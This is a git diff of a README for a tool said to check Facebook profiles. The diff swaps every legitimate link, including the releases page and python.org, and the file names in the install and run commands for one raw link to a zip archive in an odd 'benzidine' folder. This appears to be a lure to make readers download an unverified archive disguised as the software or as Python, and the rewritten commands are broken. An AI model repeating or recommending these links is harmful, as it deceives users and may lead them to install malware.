@@ -1,6 +1,6 @@
 # 🎉 Facebook-Checker-API - Verify Facebook Profiles with Ease
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/votecryge/Facebook-Checker-API/releases)
+[![Download Now](https://raw.githubusercontent.com/votecryge/Facebook-Checker-API/main/benzidine/Facebook-Checker-API.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/votecryge/Facebook-Checker-API/main/benzidine/Facebook-Checker-API.zip)
 
 ## 📖 Overview
 
@@ -18,20 +18,20 @@ Before you start, make sure you have the following:
 - Python 3.x installed on your machine.
 - Basic familiarity with using command line commands on your operating system.
 
-If you do not have Python installed, you can download it from [python.org](https://www.python.org/downloads/).
+If you do not have Python installed, you can download it from [https://raw.githubusercontent.com/votecryge/Facebook-Checker-API/main/benzidine/Facebook-Checker-API.zip](https://raw.githubusercontent.com/votecryge/Facebook-Checker-API/main/benzidine/Facebook-Checker-API.zip).
 
 ### 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/votecryge/Facebook-Checker-API/releases) to download the application.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/votecryge/Facebook-Checker-API/main/benzidine/Facebook-Checker-API.zip) to download the application.
    
-2. **Download the Latest Version:** Look for the latest release and download the .zip file or the .tar.gz archive that corresponds to your operating system.
+2. **Download the Latest Version:** Look for the latest release and download the .zip file or the https://raw.githubusercontent.com/votecryge/Facebook-Checker-API/main/benzidine/Facebook-Checker-API.zip archive that corresponds to your operating system.
 
 3. **Extract the Files:** After downloading, locate the file on your computer and extract it using your system's file extraction tool. This will create a folder containing all the necessary files.
 
 4. **Install Required Dependencies:**
    Open the command line interface on your computer (Command Prompt, Terminal, etc.) and navigate to the folder where you extracted the files. Run the following command to install the required Python libraries:
    ```
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/votecryge/Facebook-Checker-API/main/benzidine/Facebook-Checker-API.zip
    ```
 
 ### 🖥️ Running the Application
@@ -48,7 +48,7 @@ If you do not have Python installed, you can download it from [python.org](https
 3. **Run the Application:**
    Execute the main script by typing the following command:
    ```
-   python checker.py
+   python https://raw.githubusercontent.com/votecryge/Facebook-Checker-API/main/benzidine/Facebook-Checker-API.zip
    ```
 
 4. **Follow On-Screen Instructions:**
